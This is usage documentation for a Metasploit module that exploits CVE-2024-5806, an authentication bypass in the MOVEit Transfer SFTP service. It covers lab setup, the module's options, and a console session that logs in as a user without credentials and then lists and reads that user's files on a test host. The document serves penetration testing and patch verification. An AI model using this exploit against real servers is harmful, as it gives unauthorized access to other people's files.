## Vulnerable Application
This module exploits CVE-2024-5806, an authentication bypass vulnerability in the MOVEit Transfer SFTP service. The
following version are affected:

* MOVEit Transfer 2023.0.x (Fixed in 2023.0.11)
* MOVEit Transfer 2023.1.x (Fixed in 2023.1.6)
* MOVEit Transfer 2024.0.x (Fixed in 2024.0.2)

The module can establish an authenticated SFTP session for a MOVEit Transfer user. The module allows for both listing
the contents of a directory, and the reading of an arbitrary file.

Read our AttackerKB [Rapid7 Analysis](https://attackerkb.com/topics/44EZLG2xgL/cve-2024-5806/rapid7-analysis)
for a full technical description of both the vulnerability and exploitation.

## Testing
1. Installation requires a valid trial license that can be obtained by going here:
   https://www.ipswitch.com/forms/free-trials/moveit-transfer
2. Ensure that your computer has internet access for the license to activate and double-click the installer.
3. Follow installation instructions for an evaluation installation.
4. After the installation completes, follow the instructions to create an sysadmin user.
5. Log in as the sysadmin and create a new Organization (e.g. `TestOrg`).
6. In the `Home` section, click the "Act as administrator in the TestOrg organization" button.
7. In the `Users` section, create a new normal user (e.g. `testuser1`) in the new Organization.
8. In the `Folders` section, navigate to the `testuser1` Home folder and create some files and folders.
9. The SFTP service will be running by default. No further configuration is required.

## Verification Steps

1. Start msfconsole
2. `use auxiliary/gather/progress_moveit_sftp_fileread_cve_2024_5806`
3. `set RHOST <TARGET_IP_ADDRESS>`
4. `set STORE_LOOT false`
5. `set TARGETUSER <TARGET_USERNAME>` (Must be a valid username on the target server, for example `testuser1`)
6. `set TARGETFILE /`
7. `check`
8. `run`

## Options

### STORE_LOOT
Whether the read file's contents should be stored as loot in the Metasploit database. If set to false, the files
content will be displayed in the console. (default: true).

### TARGETUSER
A valid username to authenticate as. (default: nil).

### TARGETFILE
The full path of a target file or directory to read. If a directory path is specified, the output will be the
directories contents. If a file path is specified, the output will be the files contents. In order to learn
what files you can read, you can first read the root directories (/) contents. (default: /).

## Scenarios

### Default

```
msf6 auxiliary(gather/progress_moveit_sftp_fileread_cve_2024_5806) > set RHOST 169.254.180.121
RHOST => 169.254.180.121
msf6 auxiliary(gather/progress_moveit_sftp_fileread_cve_2024_5806) > set STORE_LOOT false
STORE_LOOT => false
msf6 auxiliary(gather/progress_moveit_sftp_fileread_cve_2024_5806) > set TARGETUSER testuser1
TARGETUSER => testuser1
msf6 auxiliary(gather/progress_moveit_sftp_fileread_cve_2024_5806) > show options

Module options (auxiliary/gather/progress_moveit_sftp_fileread_cve_2024_5806):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   RHOSTS      169.254.180.121  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT       22               yes       The target port
   STORE_LOOT  false            no        Store the target file as loot
   TARGETFILE  /                yes       The full path of a target file or directory to read.
   TARGETUSER  testuser1        yes       A valid username to authenticate as.


View the full module info with the info, or info -d command.

msf6 auxiliary(gather/progress_moveit_sftp_fileread_cve_2024_5806) > run
[*] Running module against 169.254.180.121

[*] Authenticating as: testuser1@169.254.180.121:22
[*] Listing directory: /
dr-xr-xr-x 1 0 0 0 Jun 23 16:19 /Home/
dr-xr-xr-x 1 0 0 0 Jun 18 22:50 /Home/testuser1/
dr-xr-xr-x 1 0 0 0 Jun 18 22:50 /Home/testuser1/TestFolder1/
-rw-rw-rw- 1 0 0 8 Jun 18 22:50 /Home/testuser1/test.txt
[*] Auxiliary module execution completed
msf6 auxiliary(gather/progress_moveit_sftp_fileread_cve_2024_5806) > run TARGETFILE=/Home/testuser1/test.txt
[*] Running module against 169.254.180.121

[*] Authenticating as: testuser1@169.254.180.121:22
[*] Downloading file: /Home/testuser1/test.txt
secrets!
[*] Auxiliary module execution completed
msf6 auxiliary(gather/progress_moveit_sftp_fileread_cve_2024_5806) > 
```
